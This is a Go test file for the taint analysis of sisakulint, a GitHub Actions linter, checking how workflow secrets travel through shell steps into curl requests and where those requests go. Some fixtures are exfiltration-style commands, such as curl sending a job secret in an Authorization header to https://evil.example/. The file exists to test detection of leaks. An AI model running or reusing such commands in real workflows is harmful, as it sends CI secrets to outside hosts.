package taint

import (
	"fmt"
	"slices"
	"strings"
	"testing"

	"github.com/gh-intel/sisakulint/actions/expr"
	"github.com/gh-intel/sisakulint/actions/shell"
	"github.com/gh-intel/sisakulint/actions/workflow"
	cst "github.com/gh-intel/sisakulint/yaml/cst/v1"
)

// flowRun analyzes a workflow whose one step has env and run, and gives
// for each simple command of the run whose command is cmd: the secrets
// each of its words carries, as "word: A,B" (token for the job's token),
// and the origin of its last word.
func flowRun(t *testing.T, env, run, cmd string) []string {
	t.Helper()
	src := "on: push\nenv:\n  W: ${{ secrets.WF }}\njobs:\n  j:\n    runs-on: ubuntu-latest\n    env:\n      J: ${{ secrets.JOB }}\n    steps:\n      - env:\n" + env + "        run: |\n" + indent(run) + "\n"
	w, _ := workflow.Parse(cst.ParseMode([]byte(src), cst.ModeGitHub))
	a := Analyze(w, nil)
	var out []string
	for _, s := range a.Sinks {
		if s.secretFlow == nil {
			continue
		}
		f := s.secretFlow
		shell.WalkSimple(f.script.List, func(x *shell.Simple) {
			if len(x.Words) == 0 {
				return
			}
			if name, ok := shell.Literal(f.text, x.Words[0]); !ok || name != cmd {
				return
			}
			for i, wd := range x.Words[1:] {
				var names []string
				for _, c := range f.secretsIn(wd) {
					if c.Token {
						names = append(names, "token")
					} else {
						names = append(names, c.Name)
					}
				}
				if len(names) > 0 {
					out = append(out, fmt.Sprintf("%d: %s", i+1, strings.Join(names, ",")))
				}
			}
			o := f.originOf(x.Words[len(x.Words)-1])
			out = append(out, "origin "+o.String())
		})
	}
	return out
}

func indent(s string) string {
	lines := strings.Split(s, "\n")
	for i := range lines {
		lines[i] = "          " + lines[i]
	}
	return strings.Join(lines, "\n")
}

func TestSecretFlowEnv(t *testing.T) {
	got := flowRun(t, "          S: ${{ secrets.STEP }}\n          B: Bearer ${{ secrets.T }}\n", `curl -H "$W $J $S $B" https://x/`, "curl")
	want := []string{"2: WF,JOB,STEP,T", "origin literal x"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestSecretFlowAssign(t *testing.T) {
	run := "X=$J\nY=\"a$X\"\nexport Z=$Y\nf() { local V=$Z; }\ncurl -H \"$Z\" -d \"$V\" https://x/"
	got := flowRun(t, "          N: none\n", run, "curl")
	want := []string{"2: JOB", "origin literal x"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestSecretFlowSubst(t *testing.T) {
	got := flowRun(t, "          N: none\n", "K=$(echo \"$J\" | jq -r .k)\ncurl -H \"$K\" https://x/", "curl")
	want := []string{"2: JOB", "origin literal x"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestSecretFlowOrder(t *testing.T) {
	got := flowRun(t, "          N: none\n", "curl -H \"X: $T\" https://x/\nT=${{ secrets.S }}", "curl")
	want := []string{"origin literal x"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestSecretFlowToken(t *testing.T) {
	got := flowRun(t, "          G: ${{ github.token }}\n", "curl -H \"$G ${{ secrets.GITHUB_TOKEN }}\" https://x/", "curl")
	want := []string{"2: token,token", "origin literal x"}
	if !slices.Equal(got, want) {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestDestinationOriginAssignedLiteral(t *testing.T) {
	got := flowRun(t, "          N: none\n", "URL=\"https://API.example.com:443/x\"\ncurl \"$URL\"", "curl")
	if want := []string{"origin literal api.example.com"}; !slices.Equal(got, want) {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestDestinationOriginNamed(t *testing.T) {
	for _, c := range []struct {
		env, run string
		want     []string
	}{
		// the secret in the destination word is carried (RequestSite leaves out one at the place of the host)
		{"          U: ${{ secrets.UPLOAD_API }}\n", `curl "$U/x"`, []string{"1: UPLOAD_API", "origin named secrets.UPLOAD_API"}},
		{"          U: ${{ vars.HOOK }}\n", `curl "$U"`, []string{"origin named vars.HOOK"}},
		{"          N: none\n", `curl "${{ github.event.client_payload.url }}"`, []string{"origin named github.event.client_payload.url"}},
		{"          N: none\n", `curl "https://$HOST/x"`, []string{"origin unnamed"}},
	} {
		got := flowRun(t, c.env, c.run, "curl")
		if want := c.want; !slices.Equal(got, want) {
			t.Errorf("%s: got %q, want %q", c.run, got, want)
		}
	}
}

func TestDestinationOriginUnnamed(t *testing.T) {
	got := flowRun(t, "          N: none\n", "URL=$(curl -s https://api.github.com/x | jq -r .url)\ncurl \"$URL\"", "curl")
	if want := []string{"origin literal api.github.com", "origin unnamed"}; !slices.Equal(got, want) {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestDestinationOriginGitHub(t *testing.T) {
	for _, run := range []string{`curl "$GITHUB_API_URL/repos/x"`, `curl "${{ github.api_url }}/repos/x"`, `curl "${{ github.server_url }}/x"`} {
		got := flowRun(t, "          N: none\n", run, "curl")
		if want := []string{"origin github"}; !slices.Equal(got, want) {
			t.Errorf("%s: got %q, want %q", run, got, want)
		}
	}
}

// TestSecretRefs: the secrets an expression reads, as job.Secrets reads
// them.
func TestSecretRefs(t *testing.T) {
	for _, c := range []struct{ src, want string }{
		{"secrets.A", "A"},
		{"secrets.GITHUB_TOKEN", "token"},
		{"github.token", "token"},
		{"github", "token"},
		{"toJSON(secrets)", "whole"},
		{"secrets[format('{0}', 'A')]", "whole"},
		{"format('{0}{1}', secrets.A, env.B)", "A"},
	} {
		n, errs := expr.Parse(c.src)
		if len(errs) > 0 {
			t.Fatal(errs)
		}
		var got []string
		SecretRefs(n, func(r SecretRef) {
			switch {
			case r.Whole:
				got = append(got, "whole")
			case r.Token:
				got = append(got, "token")
			default:
				got = append(got, r.Name)
			}
		})
		if strings.Join(got, ",") != c.want {
			t.Errorf("%s: %v, want %s", c.src, got, c.want)
		}
	}
}

// formsRun is, for the last echo of run (with env S of secrets.S), the
// secrets its first word carries, as "name form transform".
func formsRun(t *testing.T, run string) []string {
	t.Helper()
	src := "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          S: ${{ secrets.S }}\n        run: |\n" + indent(run) + "\n"
	w, _ := workflow.Parse(cst.ParseMode([]byte(src), cst.ModeGitHub))
	var out []string
	for _, s := range Analyze(w, nil).Sinks {
		f := s.secretFlow
		if f == nil {
			continue
		}
		var last *shell.Simple
		shell.WalkSimple(f.script.List, func(x *shell.Simple) {
			if len(x.Words) > 1 {
				if n, ok := shell.Literal(f.text, x.Words[0]); ok && n == "echo" {
					last = x
				}
			}
		})
		if last == nil {
			t.Fatalf("%q: no echo", run)
		}
		out = nil
		for _, c := range f.secretsIn(last.Words[1]) {
			out = append(out, strings.TrimSpace(fmt.Sprintf("%s %s %s", c.Name, c.Form, c.Transform)))
		}
	}
	return out
}

func TestSecretForms(t *testing.T) {
	for _, c := range []struct {
		run  string
		want []string
	}{
		{"V=$S\necho \"$V\"", []string{"S SecretFormVerbatim"}},
		{"V=$(echo \"$S\")\necho \"$V\"", []string{"S SecretFormVerbatim"}},
		{"V=\"pre-$S\"\necho \"$V\"", []string{"S SecretFormVerbatim"}},
		{"V=${S:-x}\necho \"$V\"", []string{"S SecretFormVerbatim"}},
		{"V=${S:0:10}\necho \"$V\"", []string{"S SecretFormTransformed substring"}},
		{"echo \"${S: -4}\"", []string{"S SecretFormTransformed substring"}},
		{"V=${S#p}\necho \"$V\"", []string{"S SecretFormTransformed prefix-removal"}},
		{"echo \"${S##*-}\"", []string{"S SecretFormTransformed prefix-removal"}},
		{"echo \"${S%-*}\"", []string{"S SecretFormTransformed suffix-removal"}},
		{"echo \"${S//-/_}\"", []string{"S SecretFormTransformed replacement"}},
		{"echo \"${S^^}\"", []string{"S SecretFormTransformed case-change"}},
		{"echo \"${S,,}\"", []string{"S SecretFormTransformed case-change"}},
		{"V=$(echo \"$S\" | base64)\necho \"$V\"", []string{"S SecretFormTransformed base64"}},
		{"V=$(jq -r .x <<< \"$S\")\necho \"$V\"", []string{"S SecretFormTransformed jq"}},
		{"V=$(base64 <<< \"$S\")\necho \"$V\"", []string{"S SecretFormTransformed base64"}},
		{"V=$(printf '%s' \"$S\" | rev | cut -c1-4)\necho \"$V\"", []string{"S SecretFormTransformed cut"}},
		{"V=$(printf '%s' \"$S\" | sha256sum)\necho \"$V\"", nil},
		{"V=$(echo \"$S\" > f | cat)\necho \"$V\"", nil}, // echo writes to f, not to the pipe (shell.PipeSources)
		{"V=$(echo \"$S\" | cat | cat)\necho \"$V\"", []string{"S SecretFormVerbatim"}},
		{"echo \"${#S}\"", nil},
		{"echo \"${S:+set}\"", nil}, // the value is not used (bashref)
		{"echo \"${X:+$S}\"", []string{"S SecretFormVerbatim"}},
		{"V=$(curl -H \"Authorization: $S\" https://x)\necho \"$V\"", []string{"S SecretFormOpaque"}},
		{"V=$(printf '%s' \"$S\" | curl -d @- https://x)\necho \"$V\"", []string{"S SecretFormOpaque"}},
	} {
		if got := formsRun(t, c.run); !slices.Equal(got, c.want) {
			t.Errorf("%q: got %q, want %q", c.run, got, c.want)
		}
	}
}

func TestSecretFlowFunctions(t *testing.T) {
	for _, c := range []struct {
		run  string
		want []string
	}{
		{"f() {\n  curl -H \"Authorization: $1\" https://evil.example/\n}\nf \"$J\"", []string{"2: JOB", "origin literal evil.example"}},
		{"f() { curl -H \"$@\" https://x/; }\nf a \"$W\"", []string{"2: WF", "origin literal x"}},
		{"f() { local V=\"$1\"; curl -d \"$V\" https://x/; }\nf \"$J\"", []string{"2: JOB", "origin literal x"}},
		{"f() { curl -d \"$1\" https://x/; }", []string{"origin literal x"}},
		{"f() { curl -d \"$2\" https://x/; }\nf \"$J\" b", []string{"origin literal x"}},
		// what reaches the read (shell.NameVisibility)
		{"f(){ curl -d \"$s\" https://x/; }; ( s=$J; f )", []string{"2: JOB", "origin literal x"}},
		{"f(){ s=$J; }; f; curl -d \"$s\" https://x/", []string{"2: JOB", "origin literal x"}},
		{"for i in 1 2; do curl -d \"$s\" https://x/; s=$J; done", []string{"2: JOB", "origin literal x"}},
		{"s=$J; s=x; curl -d \"$s\" https://x/", []string{"origin literal x"}},
		{"f(){ curl -d \"$s\" https://x/; }; s=$J f", []string{"2: JOB", "origin literal x"}},
		{"f(){ local s; s=$J; }; f; curl -d \"$s\" https://x/", []string{"origin literal x"}},
		{"f(){ curl -d \"$s\" https://x/; }; f; ( s=$J )", []string{"origin literal x"}},
		{"s=$J; s+=x; curl -d \"$s\" https://x/", []string{"2: JOB", "origin literal x"}},
		{"A=$J B=\"k:$A\"; curl -d \"$B\" https://x/", []string{"2: JOB", "origin literal x"}},
		// the destination of more than one value: the last assignment, as before
		{"if c; then U=https://a.example; else U=https://b.example; fi; curl -d \"$J\" \"$U/x\"", []string{"2: JOB", "origin literal b.example"}},
		// an assignment in a substitution
		{"y=$(s=$J; curl -d \"$s\" https://x/)", []string{"2: JOB", "origin literal x"}},
		// an element of an array
		{"a[0]=$J; curl -d \"${a[0]}\" https://x/", []string{"2: JOB", "origin literal x"}},
		{"a[$i]=$J; curl -d \"${a[1]}\" https://x/", []string{"2: JOB", "origin literal x"}},
	} {
		if got := flowRun(t, "          N: none\n", c.run, "curl"); !slices.Equal(got, c.want) {
			t.Errorf("%q: got %q, want %q", c.run, got, c.want)
		}
	}
	if got := formsRun(t, "g() { local V=\"${1:0:4}\"; echo \"$V\"; }\ng \"$S\""); !slices.Equal(got, []string{"S SecretFormTransformed substring"}) {
		t.Errorf("g: got %q", got)
	}
}

// flowWorkflow is, for each simple command named cmd in the workflow src,
// the secrets its words carry as "word: name form", in the order of the
// sinks.
func flowWorkflow(t *testing.T, src, cmd string) []string {
	t.Helper()
	w, _ := workflow.Parse(cst.ParseMode([]byte(src), cst.ModeGitHub))
	var out []string
	for _, s := range Analyze(w, nil).Sinks {
		f := s.secretFlow
		if f == nil {
			continue
		}
		shell.WalkSimple(f.script.List, func(x *shell.Simple) {
			if len(x.Words) == 0 {
				return
			}
			if n, ok := shell.Literal(f.text, x.Words[0]); !ok || n != cmd {
				return
			}
			for i, wd := range x.Words[1:] {
				for _, c := range f.secretsIn(wd) {
					out = append(out, fmt.Sprintf("%d: %s %s", i+1, c.Name, c.Form))
				}
			}
		})
	}
	return out
}

func TestSecretAcrossSteps(t *testing.T) {
	for _, c := range []struct {
		name, src string
		want      []string
	}{
		{"env", `on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      S: ${{ secrets.S }}
    steps:
      - run: echo "D=${S:6}" >> "$GITHUB_ENV"
      - run: curl -d "$D" https://x/
`, []string{"2: S SecretFormTransformed"}},
		{"step env wins", `on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      S: ${{ secrets.S }}
    steps:
      - run: echo "D=${S:6}" >> "$GITHUB_ENV"
      - env:
          D: none
        run: curl -d "$D" https://x/
`, nil},
		{"output", `on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: w
        env:
          S: ${{ secrets.S }}
        run: echo "o=$S" >> "$GITHUB_OUTPUT"
      - run: curl -H "${{ steps.w.outputs.o }}" https://x/
      - env:
          O: ${{ steps.w.outputs.o }}
        run: curl -H "$O" https://x/
`, []string{"2: S SecretFormVerbatim", "2: S SecretFormVerbatim"}},
		{"heredoc", `on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      S: ${{ secrets.S }}
    steps:
      - run: |
          {
            echo "D<<EOF"
            echo "${S:1}"
            echo "EOF"
          } >> "$GITHUB_ENV"
      - run: curl -d "$D" https://x/
`, []string{"2: S SecretFormTransformed"}},
		{"needs", `on: push
jobs:
  a:
    runs-on: ubuntu-latest
    outputs:
      d: ${{ steps.w.outputs.o }}
      v: ${{ steps.w.outputs.v }}
    env:
      S: ${{ secrets.S }}
    steps:
      - id: w
        run: |
          echo "o=${S:7}" >> "$GITHUB_OUTPUT"
          echo "v=$S" >> "$GITHUB_OUTPUT"
  b:
    needs: a
    runs-on: ubuntu-latest
    steps:
      - run: curl -d "${{ needs.a.outputs.d }}" -H "${{ needs.a.outputs.v }}" https://x/
`, []string{"2: S SecretFormTransformed"}},
		{"parallel", `on: push
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      S: ${{ secrets.S }}
    steps:
      - parallel:
          - run: echo "D=${S:6}" >> "$GITHUB_ENV"
          - run: curl -d "$D" https://x/
`, nil},
	} {
		if got := flowWorkflow(t, c.src, "curl"); !slices.Equal(got, c.want) {
			t.Errorf("%s: got %q, want %q", c.name, got, c.want)
		}
	}
}

// TestSecretFlowAlternateWord: ${X:+word} with the secret in its word.
func TestSecretFlowAlternateWord(t *testing.T) {
	for _, c := range []struct {
		run  string
		want []string
	}{
		{`curl -H "Authorization: token ${J:+$J}" https://evil.example/`, []string{"2: JOB", "origin literal evil.example"}},
	} {
		if got := flowRun(t, "          N: none\n", c.run, "curl"); !slices.Equal(got, c.want) {
			t.Errorf("%q: got %q, want %q", c.run, got, c.want)
		}
	}
}

// TestRequestSecretsOnce: a request
// carries a secret at a place once, whatever forms the value has.
func TestRequestSecretsOnce(t *testing.T) {
	src := "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    env:\n      T: ${{ secrets.T }}\n    steps:\n      - run: |\n          V=\"$T ${T:0:4}\"\n          curl -H \"$V\" https://x/\n"
	w, _ := workflow.Parse(cst.ParseMode([]byte(src), cst.ModeGitHub))
	for _, s := range Analyze(w, nil).Sinks {
		for _, r := range s.Requests {
			if len(r.Secrets) != 1 {
				t.Errorf("%d secrets: %+v", len(r.Secrets), r.Secrets)
			}
		}
	}
}

func TestJobTokenRef(t *testing.T) {
	for src, want := range map[string]bool{
		"github.token":              true,
		"github['token']":           true,
		"secrets . GITHUB_TOKEN":    true,
		"secrets['github_token']":   true,
		"secrets.GITHUB_TOKEN_PAT":  false,
		"secrets.PAT":               false,
		"github":                    false,
		"secrets.GITHUB_TOKEN || x": false,
	} {
		n, err := expr.Parse(src)
		if err != nil {
			t.Fatalf("%s: %v", src, err)
		}
		if got := JobTokenRef(n); got != want {
			t.Errorf("%s: %v, want %v", src, got, want)
		}
	}
}

// outputCalls is how many calls of functions the readings of outputs of
// the run of the one step of a workflow followed into their bodies.
func outputCalls(t *testing.T, run string) int {
	t.Helper()
	src := "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    env:\n      S: ${{ secrets.S }}\n    steps:\n      - run: |\n" + indent(run) + "\n"
	w, _ := workflow.Parse(cst.ParseMode([]byte(src), cst.ModeGitHub))
	n := 0
	for _, s := range Analyze(w, nil).Sinks {
		if s.secretFlow != nil {
			n += s.secretFlow.out.Calls()
		}
	}
	return n
}

// substitutionChain is n functions f1 to fn, each but the last printing
// two $( ) of the next, the last printing last.
func substitutionChain(n int, last string) string {
	var b strings.Builder
	for i := 1; i < n; i++ {
		fmt.Fprintf(&b, "f%d() { echo \"$(f%[2]d)$(f%[2]d)\"; }\n", i, i+1)
	}
	fmt.Fprintf(&b, "f%d() { %s; }\n", n, last)
	return b.String()
}

// TestOutputSecretsMemo: the value of a $( ) is read once for a place it is
// read at and what its reading starts from.
func TestOutputSecretsMemo(t *testing.T) {
	if n := outputCalls(t, "f() { echo \"$(g)\"; }\ng() { :; }\nh() { f; f; }\nh | cat"); n != 4 {
		t.Errorf("one $( ) at two calls: %d calls read, want 4", n)
	}
	if n := outputCalls(t, substitutionChain(22, `echo "t=${S:1}"`)+"f1 | cat"); n > 64 {
		t.Errorf("a chain of 22 functions of two $( ): %d calls read", n)
	}
	if n := outputCalls(t, substitutionChain(22, `echo "$(f1)"; echo "t=${S:1}"`)+"f1 | cat"); n > 128 {
		t.Errorf("a chain of 22 functions of two $( ) with a recursion: %d calls read", n)
	}
}

// TestSecretFlowFunctionOutput: a $( ) of a call carries what the body of
// the function writes.
func TestSecretFlowFunctionOutput(t *testing.T) {
	for _, c := range []struct {
		run  string
		want []string
	}{
		{"f() { echo \"$J\"; }\ncurl -H \"Authorization: $(f)\" https://example.com/", []string{"2: JOB", "origin literal example.com"}},
		// the corpus (zerx-lab__FluxDown release.yml): a JWT signed with the
		// secret, made by a function
		{"_amo_jwt() {\n  sig=$(printf '%s' \"$h\" | openssl dgst -sha256 -hmac \"$J\" -binary | base64 -w0)\n  printf '%s.%s' \"$h\" \"$sig\"\n}\ncurl -sf -H \"Authorization: JWT $(_amo_jwt)\" https://addons.mozilla.org/api/v5/", []string{"3: JOB", "origin literal addons.mozilla.org"}},
		{"f() { return; echo \"$J\"; }\ncurl -H \"Authorization: $(f)\" https://example.com/", []string{"origin literal example.com"}},
	} {
		if got := flowRun(t, "          N: none\n", c.run, "curl"); !slices.Equal(got, c.want) {
			t.Errorf("%q:\n got %q\nwant %q", c.run, got, c.want)
		}
	}
}

// TestWriterSecrets: what a command not known that a write gives writes is
// read as before the readings of descriptors: every simple command of it and
// of the bodies of the functions it calls writes what it may write, wherever
// its descriptors point (reading it with the descriptors there waits for a
// reading of the data flow of the shell's variables). The prints after return
// and after a redirect elsewhere count (the false positive writer-body).
func TestWriterSecrets(t *testing.T) {
	for _, c := range []struct {
		run, cmd string
		want     []string
	}{
		{"f() { return; echo \"$J\"; }\nf a >> out", "f", []string{"JOB"}}, // the false positive writer-body
		{"f() { echo \"$J\"; }\nf a >> out", "f", []string{"JOB"}},
		{"f() { echo \"$J\" >&2; }\nf a 2>/dev/null >> out", "f", []string{"JOB"}}, // the false positive writer-body
		{"tool \"$J\" >&2", "tool", []string{"JOB"}},
		{"tool \"$J\" >> out", "tool", []string{"JOB"}},
		// a body that points the standard output at a descriptor the writer
		// points where its standard output goes
		{"f() { exec >&2; echo \"$J\"; }\nf a >> out 2>&1", "f", []string{"JOB"}},
		{"f() { exec 1>&3; echo \"$J\"; }\nf a >> out 3>&1", "f", []string{"JOB"}},
	} {
		src := "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    env:\n      J: ${{ secrets.JOB }}\n    steps:\n      - run: |\n" + indent(c.run) + "\n"
		w, _ := workflow.Parse(cst.ParseMode([]byte(src), cst.ModeGitHub))
		var got []string
		for _, s := range Analyze(w, nil).Sinks {
			f := s.secretFlow
			if f == nil {
				continue
			}
			// the pieces not known that Writes gives for the writes to out and
			// to the log
			writes := shell.Writes(f.text, f.script, shell.WriteOptions{Log: true, Target: func(w shell.Word) bool {
				t, ok := shell.Literal(f.text, w)
				return ok && t == "out"
			}})
			for _, wr := range writes {
				for _, o := range wr.Out {
					if o.Kind != shell.OutUnknown || o.By == nil {
						continue
					}
					if n, ok := shell.Literal(f.text, o.By.Words[0]); !ok || n != c.cmd {
						continue
					}
					for _, cs := range f.writerSecrets(o) {
						got = append(got, cs.Name)
					}
				}
			}
		}
		if !slices.Equal(got, c.want) {
			t.Errorf("%q: got %q, want %q", c.run, got, c.want)
		}
	}
}
